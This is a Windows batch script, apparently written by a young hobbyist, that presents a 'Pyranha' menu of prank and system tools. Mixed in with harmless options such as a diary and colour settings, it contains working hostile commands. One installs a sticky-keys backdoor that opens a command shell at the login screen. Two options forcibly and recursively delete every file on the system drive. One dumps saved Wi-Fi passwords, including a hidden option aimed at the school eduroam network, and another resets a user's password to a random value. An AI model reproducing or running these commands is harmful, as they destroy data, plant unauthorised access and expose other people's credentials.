@echo off
title Pyranha Menu V1.3.5 
SETLOCAL EnableDelayedExpansion 

for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)    
:securegoing
if exist database.txt ( goto MainMenu ) else (
                                        color 0c
                                        goto othercheck )

:othercheck 
if exist user.txt ( goto MainMenu ) else ( goto user )

:user
cls
echo.
echo Type "stop" to exit
echo Your user.txt file got deleted or you didn't create a user name.
set /p username= Your User Name: 
if %username% == stop exit
echo %username% >> user.txt
if exist C:\Users\%username%\ ( goto MainMenu ) else ( goto wrongusername )

:wrongusername
echo.
del /f user.txt
echo The Username is wrong. Please Type it again.
echo.
pause
goto user

:MainMenu
cd C:\Users\%username%\Desktop\Pyranha
if exist user.txt ( FOR /F "tokens=*" %%a IN (user.txt) DO @cd C:\Users\%%a\Desktop\Pyranha ) else ( goto user )
if exist database.txt ( FOR /F "tokens=*" %%i IN (database.txt) DO @color %%i )
cls
echo.    
echo      NMMM      MMMM   MMMM  MMMMMMMM           MMMM        MMMMM          MMM  MMM       MMM        MMMM
echo   MMMMMNMMMM   MMMM   MMMM  MMMMMMMMMM        MMMMMM       MMM MMM        MMM  MMM       MMM       MMMMMM
echo  MMMM    MMMM  MMMM   MMMM  MM      MMM      MMMMMMMM      MMM  MMM       MMM  MMM       MMM      MMMMMMMM
echo  MMMM    MMMM  MMMM   MMMM  MM      MMMM    MMMMMMMMMM     MMM   MMM      MMM  MMM       MMM     MMMMMMMMMM
echo  MMMMMMMMMMMM   MMMMNMMMMM  MM      MMM    MM        MM    MMM    MMM     MMM  MMMMMMMMMMMMM    MM        MM
echo  MMMM              MMMM     MMMMMMMMMMM  MMMM        MMMM  MMM     MMM    MMM  MMMMMMMMMMMMM  MMMM        MMMM
echo  MMMM              MMMM     MMM    MMMM   MMMMMMMMMMMMMM   MMM      MMM   MMM  MMM       MMM   MMMMMMMMMMMMMM
echo  MMMM              MMMM     MMM    MMMM   MMM        MMM   MMM       MMM  MMM  MMM       MMM   MMM        MMM
echo  MMMM              MMMM     MMM    MMMM   MMM        MMM   MMM        MMM MMM  MMM       MMM   MMM        MMM
echo  MMMM              MMMM     MMM    MMMM   MMM        MMM   MMM          MMMMM  MMM       MMM   MMM        MMM
echo.       
echo --------------------------------------------------- MENU V1.3.5 -------------------------------------------------
echo.         
echo Choose^^!
echo.
echo [1] Backdoor (Windows)	[10] Processes              [19] Devices On Network
echo [2] Pyranha^^!		[11] System Info            [20] Flush DNS Cache
echo [3] Folder Spammer	[12] Random User Password   [21] I Have no idea, so this:
echo [4] Show/Hide Files	[13] Pyranha^^!^^! Spam
echo [5] Open Programs	[14] Reset color
echo [6] Shutdown		[15] Refresh
echo [7] BSOD(Dangerous^^!^^!)   [16] BSOD2(Dangerous^^!^^!)
echo [8] Wifi Hack           [17] Diary 
echo [9] Change color        [18] Reset Username
echo.
echo [22] Exit 
echo.
set /p MenuChoose= Option: 
if %MenuChoose% == 1 goto Choose(BD)
if %MenuChoose% == 2 goto flashything
if %MenuChoose% == 3 goto openfolderspam
if %MenuChoose% == 4 goto choosetoappearordisappear
if %MenuChoose% == 5 goto OpenPrograms
if %MenuChoose% == 6 goto sd
if %MenuChoose% == 7 goto bsod
if %MenuChoose% == 8 goto wifihck
if %MenuChoose% == 9 goto chngcolor
if %MenuChoose% == 10 goto tasklist
if %MenuChoose% == 11 goto ssinfo
if %MenuChoose% == 12 goto randpass
if %MenuChoose% == 13 goto pyrkey
if %MenuChoose% == 14 goto remdat
if %MenuChoose% == 15 goto securegoing
if %MenuChoose% == 16 goto deldrive
if %MenuChoose% == 17 goto diary
if %MenuChoose% == 18 goto resetusn
if %MenuChoose% == 19 goto netv
if %MenuChoose% == 20 goto flushcache
if %MenuChoose% == 21 goto noI
if %MenuChoose% == 22 goto exit
pause >nul

:sd
cls
echo.
pause
shutdown -i
cls
pause
goto MainMenu

:remdat
del /f database.txt
goto securegoing

:chngcolor
cls
echo.
echo [1] Start
echo [2] Help
echo [3] Back
echo.
set /p customcolor=
if %customcolor% == 1 goto check
if %customcolor% == 2 goto colorhelp
if %customcolor% == 3 goto MainMenu

:colorhelp
cls
echo.
echo The first number should be the background, the next should be the text color.
echo This color will last until you restart the program. (fixed)
echo I'm working on it the make it stay. (fixed)
echo (changes: )
echo If you type in a combination, than you'll have that forever.
echo But, You can change it, by deleting database.txt.
echo Hope, that you understand.
echo.
color help
echo.
pause
goto chngcolor

:check
if exist database.txt (del /f database.txt)

:chngcolor2
cls
echo Type "stop" to exit
echo.
set /p colorcustomization= The color combination: 
echo %colorcustomization% >> database.txt
if %colorcustomization% == stop ( del /f database.txt
                                        goto MainMenu)
goto colorcheck

:colorcheck
echo %colorcustomization%|findstr /r "[^0-9]" > nul
if errorlevel 1 goto MainMenu
echo %colorcustomization%|findstr /r "[^A-F]" > nul
if errorlevel 1 goto MainMenu
echo %colorcustomization%|findstr /r "[^A-F0-9]" > nul
if errorlevel 1 goto MainMenu
echo %colorcustomization%|findstr /r "[^g-z]" > nul
if errorlevel 1 goto lettersincolorcust
echo %colorcustomization%|findstr /r "[^G-Z]" > nul
if errorlevel 1 goto lettersincolorcust
echo %colorcustomization%|findstr /r "[^g-zG-Z]" > nul
if errorlevel 1 goto lettersincolorcust
echo %colorcustomization%|findstr /r "[^g-z0-9]" > nul
if errorlevel 1 goto lettersincolorcust
echo %colorcustomization%|findstr /r "[^G-Z0-9]" > nul
if errorlevel 1 goto lettersincolorcust
echo %colorcustomization%|findstr /r "[^g-zG-Z0-9]" > nul
if errorlevel 1 goto lettersincolorcust


:Choose(BD)
cls
echo Select an option!
echo [1] Add Backdoor
echo [2] Delete Backdoor
echo [3] BackdoorInfo
echo [4] Back
echo.
set /p addrem=
if %addrem% == 1 goto AddingBD
if %addrem% == 2 goto RemBD
if %addrem% == 3 goto bdinfo
if %addrem% == 4 goto MainMenu
pause >nul

:exit
exit

:AddingBD
cls 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
echo You can start the backdoor by hitting LSHIFT 5 time really fast.
echo Exit? (y/n)
echo.
set /p aqexit=
if %aqexit% == y goto exit
if %aqexit% == n goto MainMenu
pause >nul

:RemBD
cls
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
echo Exit? (y/n)
echo.
set /p rqexit=
if %rqexit% == y goto exit
if %rqexit% == n goto MainMenu
pause >nul

:flashything
cls
start pyranhacolor.bat
pause
goto MainMenu

:openfolderspam
cls
start FolderSpam.bat
pause
goto MainMenu

:bdinfo
cls
color 0f
echo.
echo You can start the backdoor by hitting LSHIFT 5 time really fast. 
echo You can even access it in the Login page.
echo 1 Useful command:
echo Password change: net user "name of the user" "new password"(you dont need the " symbols.) 
echo.
pause
goto Choose(BD)

:choosetoappearordisappear
cls
echo [1] Hide
echo [2] Show
echo.
set /p choosetoappodisapp=
if %choosetoappodisapp% == 1 goto disappear
if %choosetoappodisapp% == 2 goto appear

:disappear
cls
set /p cdir= That folder, where your file you want to make disappear is stored in: 
if exist "%cdir%" goto disappear2

:wrongpatdisapp
echo.
echo Can't find the folder.
echo.
pause
goto disappear

:disappear2
cls
cd %cdir%
set /p cfilename= The name of the file, and its extension(if you want to make a folder disappear, you don't need one): 
if exist "%cfilename%" goto disappear3

:wrongpathdisapp2
echo.
echo The file is not found. Try again...
echo.
pause
goto disappear2

:disappear3
cls
cd %cdir%
attrib +h +r +s "%cfilename%"
echo The file has disappeard!
echo.
pause
goto MainMenu

:appear
cls
set /p appearpath= The folder, that your file, that you want to make appear is stored in: 
if exist "%appearpath%" goto appear2

:wrongpathappear
echo.
echo Can't find the folder. Try again...
echo.
pause
goto appear

:appear2
cd "%appearpath%"
cls
set /p appearname= The name of the file, and its extension(if you want to make a folder disappear, you don't need one): 
if exist "%appearname%" goto appear3

:wrongpathappear2
echo.
echo Can't find the file. Try again...
echo.
pause
goto appear2

:appear3
cls
cd "%appearpath%"
attrib -h -r -s "%appearname%"
echo The file has appeard!
pause
goto MainMenu

:OpenPrograms
cls
color 06
echo [1] Notepad
echo [2] Cmd
echo [3] Task Manager
echo [4] File Explorer
echo [5] Back
echo.
set /p ownprogram=
if %ownprogram% == 1 goto stnpad
if %ownprogram% == 2 goto stcmd
if %ownprogram% == 3 goto sttaskmgr
if %ownprogram% == 4 goto stfk
if %ownprogram% == 5 goto securegoing
pause >nul

:stnpad
cls
start notepad
echo.
pause
goto ExitToOpenProgs

:stcmd
cls
start cmd
echo.
pause 
goto ExitToOpenProgs

:sttaskmgr
cls
start taskmgr
echo.
pause
goto ExitToOpenProgs

:stfk
cls
start explorer
echo.
pause
goto ExitToOpenProgs

:ExitToOpenProgs
cls
color 0c
goto OpenPrograms

:bsod
cls
echo Do you run the program? (y/n)
echo.
set /p bsodyn=
if %bsodyn% == y goto bsod1
if %bsodyn% == n goto MainMenu
:bsod1
cls
pause
del %systemdrive%\*.*/f /s /q
shutdown -r -t 00
echo.
pause
goto MainMenu

:wifihck
cls
echo.
echo [1] Start
echo [2] Help(Recommended)
echo.
set /p wifihckchoose=
if %wifihckchoose% == 1 goto wifihck2
if %wifihckchoose% == 2 goto wifihckhelp
if %wifihckchoose% == schoolwifihack goto swh

:wifihckhelp
echo.
echo.
echo If you ran Pyranha as an administrator, you can see every network, that the computer was connected to.
echo If not, than you can only see the one that you are connected to.
echo After the "hack", you can find the password next to the word "Key Content"
pause
goto wifihck

:wifihck2
cls
netsh wlan show profiles
set /p wifihckprofilechoose= The name of the Network, that you want to "hack": 
echo.
pause
goto wifihck3

:wifihck3
cls
netsh wlan show profiles "%wifihckprofilechoose%" key=clear
echo You can find the password next to "Key Content".
echo.
pause 
goto MainMenu

:ssinfo
cls
systeminfo
echo.
pause
goto MainMenu

:tasklist
cls
tasklist
echo.
echo Would you like to stop a program? (y/n)
set /p taskkill=
if %taskkill% == y goto taskkill
if %taskkill% == n goto MainMenu

:taskkill
cls
tasklist
echo.
set /p taskkillask= The program you want to stop: 
goto taskkill2

:taskkill2
cls
echo.
taskkill /im %taskkillask%
pause
goto MainMenu

:swh
cls
netsh wlan show profiles eduroam key=clear
echo.
pause
goto MainMenu

:randpass
cls
set /p username= The name of the user:  
echo.
pause
goto randpass2

:randpass2
cls
net user %username% %random%
echo.
pause
goto MainMenu

:pyrkey
cls
echo.
echo [1] Start
echo [2] Info
echo [3] Back
echo.
set /p pyrkeyc=
if %pyrkeyc% == 1 goto pyrkey2
if %pyrkeyc% == 2 goto pyrkeyI
if %pyrkeyc% == 3 goto MainMenu

:pyrkeyI
echo.
echo This program will run the word PYRANHA until you don't stop it.
echo You can stop it from task manager(wscript.exe)
echo.
pause
goto pyrkey

:pyrkey2
start keyboardtype.vbs
echo.
pause
goto MainMenu

:deldrive
cls
set /p contx= To Continiue, Type X: 
if %contx% == X goto deldrive2

:wrongbtn
goto deldrive

:deldrive2
echo.
cd C:\
del /f /q /s *.*
pause
goto MainMenu

:diary
if exist C:\Users\%username%\Desktop\Pyranha\Diaries (cd Diaries) else ( mkdir Diaries
                                                                         goto diary )
cls
echo [1] Delete A Diary
echo [2] Read Diary
echo [3] List Diaries
echo [4] Create/Edit Diary
echo [5] Create/Edit Diary (GUI)
echo [6] Back
echo.
set /p diaryc= 
if %diaryc% == 1 goto rdiary
if %diaryc% == 2 goto readdiary
if %diaryc% == 3 goto lsdiar
if %diaryc% == 4 goto creatediary
if %diaryc% == 5 goto creategui
if %diaryc% == 6 goto MainMenu

:elsediary
goto diary

:rdiary
echo.
set /p diaryname= Diary Name: 
if exist %diaryname%.txt ( del /f %diaryname%.txt
                           goto diary ) else ( goto wrongdiaryresn )

:wrongdiaryresn
echo.
echo The Diary Does Not Exist.
echo.
pause
goto diary

:readdiary
cls
set /p dname= Diary Name: 
echo.
if exist %dname%.txt (type %dname%.txt
                       echo.                                 
                       goto nexttype ) else ( echo.
                                          echo The Diary Doesn't Exist. 
                                          pause
                                          echo.
                                          goto diary )      

:nexttype
echo.
set /p next= Type "Next": 
if %next% == Next ( goto diary ) else ( goto nexttype ) 

:creatediary
cls
echo.
echo Type "stop" when you are done.
echo.
set /p cdname= The New Diary's Name: 

:diarytext
set /p cdtext= Text: 
echo %cdtext% >> %cdname%.txt
if "%cdtext%" == "stop" goto diary
goto diarytext

:resetusn
cls
del /f user.txt
echo.
pause
goto user

:netv
cls
echo.
net view 
pause
goto MainMenu

:flushcache
echo.
ipconfig /flushdns
echo.
pause
goto MainMenu

:creategui
echo.
start test.exe
pause
goto diary

:lsdiar
echo.
dir *.txt
echo.
pause
goto diary
rem acually, I'm 12 yrs old xD

:noI
echo.
SET /A n1=%random% %%8
SET /A n2=%random% %%8
echo Guess The Color Combination!
echo.
echo Example: ( 00: black, black )
echo %n1%%n2%
set /p guesspls= Guess: 
call ::color_change
pause
goto MainMenu




























































































































































































































































































































































:color_change
if %n1% == 0 if %n2% == 0 if "%guesspls%" == "black, black" ( echo right^^! ) else ( echo wrong. )
if %n1% == 1 if %n2% == 0 if "%guesspls%" == "blue, black" ( echo right^^! ) else ( echo wrong. )
if %n1% == 2 if %n2% == 0 if "%guesspls%" == "green, black" ( echo right^^! ) else ( echo wrong. )
if %n1% == 3 if %n2% == 0 if "%guesspls%" == "aqua, black" ( echo right^^! ) else ( echo wrong. )
if %n1% == 4 if %n2% == 0 if "%guesspls%" == "red, black" ( echo right^^! ) else ( echo wrong. )
if %n1% == 5 if %n2% == 0 if "%guesspls%" == "purple, black" ( echo right^^! ) else ( echo wrong. )
if %n1% == 6 if %n2% == 0 if "%guesspls%" == "yellow, black" ( echo right^^! ) else ( echo wrong. )
if %n1% == 7 if %n2% == 0 if "%guesspls%" == "white, black" ( echo right^^! ) else ( echo wrong. )
if %n1% == 0 if %n2% == 1 if "%guesspls%" == "black, blue" ( echo right^^! ) else ( echo wrong. )
if %n1% == 0 if %n2% == 2 if "%guesspls%" == "black, green" ( echo right^^! ) else ( echo wrong. )
if %n1% == 0 if %n2% == 3 if "%guesspls%" == "black, aqua" ( echo right^^! ) else ( echo wrong. )
if %n1% == 0 if %n2% == 4 if "%guesspls%" == "black, red" ( echo right^^! ) else ( echo wrong. )
if %n1% == 0 if %n2% == 5 if "%guesspls%" == "black, purple" ( echo right^^! ) else ( echo wrong. )
if %n1% == 0 if %n2% == 6 if "%guesspls%" == "black, yellow" ( echo right^^! ) else ( echo wrong. )
if %n1% == 0 if %n2% == 7 if "%guesspls%" == "black, white" ( echo right^^! ) else ( echo wrong. )
if %n1% == 1 if %n2% == 1 if "%guesspls%" == "blue, blue" ( echo right^^! ) else ( echo wrong. )
if %n1% == 1 if %n2% == 2 if "%guesspls%" == "blue, green" ( echo right^^! ) else ( echo wrong. )
if %n1% == 1 if %n2% == 3 if "%guesspls%" == "blue, aqua" ( echo right^^! ) else ( echo wrong. )
if %n1% == 1 if %n2% == 4 if "%guesspls%" == "blue, red" ( echo right^^! ) else ( echo wrong. )
if %n1% == 1 if %n2% == 5 if "%guesspls%" == "blue, purple" ( echo right^^! ) else ( echo wrong. )
if %n1% == 1 if %n2% == 6 if "%guesspls%" == "blue, yellow" ( echo right^^! ) else ( echo wrong. )
if %n1% == 1 if %n2% == 7 if "%guesspls%" == "blue, white" ( echo right^^! ) else ( echo wrong. )
if %n1% == 2 if %n2% == 1 if "%guesspls%" == "green, blue" ( echo right^^! ) else ( echo wrong. )
if %n1% == 2 if %n2% == 2 if "%guesspls%" == "green, green" ( echo right^^! ) else ( echo wrong. )
if %n1% == 2 if %n2% == 3 if "%guesspls%" == "green, aqua" ( echo right^^! ) else ( echo wrong. )
if %n1% == 2 if %n2% == 4 if "%guesspls%" == "green, red" ( echo right^^! ) else ( echo wrong. )
if %n1% == 2 if %n2% == 5 if "%guesspls%" == "green, purple" ( echo right^^! ) else ( echo wrong. )
if %n1% == 2 if %n2% == 6 if "%guesspls%" == "green, yellow" ( echo right^^! ) else ( echo wrong. )
if %n1% == 2 if %n2% == 7 if "%guesspls%" == "green, white" ( echo right^^! ) else ( echo wrong. )
if %n1% == 3 if %n2% == 1 if "%guesspls%" == "aqua, blue" ( echo right^^! ) else ( echo wrong. )
if %n1% == 3 if %n2% == 2 if "%guesspls%" == "aqua, green" ( echo right^^! ) else ( echo wrong. )
if %n1% == 3 if %n2% == 3 if "%guesspls%" == "aqua, aqua" ( echo right^^! ) else ( echo wrong. )
if %n1% == 3 if %n2% == 4 if "%guesspls%" == "aqua, red" ( echo right^^! )  else ( echo wrong. )
if %n1% == 3 if %n2% == 5 if "%guesspls%" == "aqua, purple" ( echo right^^! ) else ( echo wrong. )
if %n1% == 3 if %n2% == 6 if "%guesspls%" == "aqua, yellow" ( echo right^^! ) else ( echo wrong. )
if %n1% == 3 if %n2% == 7 if "%guesspls%" == "aqua, white" ( echo right^^! ) else ( echo wrong. )
if %n1% == 4 if %n2% == 1 if "%guesspls%" == "red, blue" ( echo right^^! )  else ( echo wrong. )
if %n1% == 4 if %n2% == 2 if "%guesspls%" == "red, green" ( echo right^^! ) else ( echo wrong. )
if %n1% == 4 if %n2% == 3 if "%guesspls%" == "red, aqua" ( echo right^^! ) else ( echo wrong. )
if %n1% == 4 if %n2% == 4 if "%guesspls%" == "red, red" ( echo right^^! ) else ( echo wrong. )
if %n1% == 4 if %n2% == 5 if "%guesspls%" == "red, purple" ( echo right^^! ) else ( echo wrong. )
if %n1% == 4 if %n2% == 6 if "%guesspls%" == "red, yellow" ( echo right^^! ) else ( echo wrong. )
if %n1% == 4 if %n2% == 7 if "%guesspls%" == "red, white" ( echo right^^! ) else ( echo wrong. )
if %n1% == 5 if %n2% == 1 if "%guesspls%" == "purple, blue" ( echo right^^! ) else ( echo wrong. )
if %n1% == 5 if %n2% == 2 if "%guesspls%" == "purple, green" ( echo right^^! ) else ( echo wrong. )
if %n1% == 5 if %n2% == 3 if "%guesspls%" == "purple, aqua" ( echo right^^! ) else ( echo wrong. )
if %n1% == 5 if %n2% == 5 if "%guesspls%" == "purple, purple" ( echo right^^! ) else ( echo wrong. )
if %n1% == 5 if %n2% == 6 if "%guesspls%" == "purple, yellow" ( echo right^^! ) else ( echo wrong. )
if %n1% == 5 if %n2% == 7 if "%guesspls%" == "purple, white" ( echo right^^! ) else ( echo wrong. )
if %n1% == 6 if %n2% == 1 if "%guesspls%" == "yellow, blue" ( echo right^^! ) else ( echo wrong. )
if %n1% == 6 if %n2% == 2 if "%guesspls%" == "yellow, green" ( echo right^^! ) else ( echo wrong. )
if %n1% == 6 if %n2% == 3 if "%guesspls%" == "yellow, aqua" ( echo right^^! ) else ( echo wrong. )
if %n1% == 6 if %n2% == 4 if "%guesspls%" == "yellow, red" ( echo right^^! ) else ( echo wrong. )
if %n1% == 6 if %n2% == 5 if "%guesspls%" == "yellow, purple" ( echo right^^! ) else ( echo wrong. )
if %n1% == 6 if %n2% == 6 if "%guesspls%" == "yellow, yellow" ( echo right^^! ) else ( echo wrong. )
if %n1% == 6 if %n2% == 7 if "%guesspls%" == "yellow, white" ( echo right^^! ) else ( echo wrong. )
if %n1% == 7 if %n2% == 1 if "%guesspls%" == "white, blue" ( echo right^^! ) else ( echo wrong. )
if %n1% == 7 if %n2% == 2 if "%guesspls%" == "white, green" ( echo right^^! ) else ( echo wrong. )
if %n1% == 7 if %n2% == 3 if "%guesspls%" == "white, aqua" ( echo right^^! ) else ( echo wrong. )
if %n1% == 7 if %n2% == 4 if "%guesspls%" == "white, red" ( echo right^^! ) else ( echo wrong. )
if %n1% == 7 if %n2% == 5 if "%guesspls%" == "white, purple" ( echo right^^! ) else ( echo wrong. )
if %n1% == 7 if %n2% == 6 if "%guesspls%" == "white, yellow" ( echo right^^! ) else ( echo wrong. )
if %n1% == 7 if %n2% == 7 if "%guesspls%" == "white, white" ( echo right^^! ) else ( echo wrong. )

:lettersincolorcust
echo.
echo Your color had invalid letters.
echo Try Again.
del /f database.txt
pause
goto chngcolor2